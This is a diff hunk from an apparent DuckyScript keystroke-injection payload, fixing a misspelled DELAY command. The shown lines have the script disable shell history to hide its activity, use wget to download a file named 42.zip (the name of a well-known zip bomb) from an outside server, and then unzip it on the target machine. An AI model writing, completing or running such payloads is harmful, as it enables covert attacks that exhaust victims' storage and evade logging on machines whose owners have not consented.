@@ -7,7 +7,7 @@ STRING set +o history
 DELAY 300
 ENTER
 STRING wget https://www.lostserver.com/static/42.zip
-DLEAY 5000
+DELAY 5000
 ENTER
 STRING unzip 42.zip
 DELAY 300
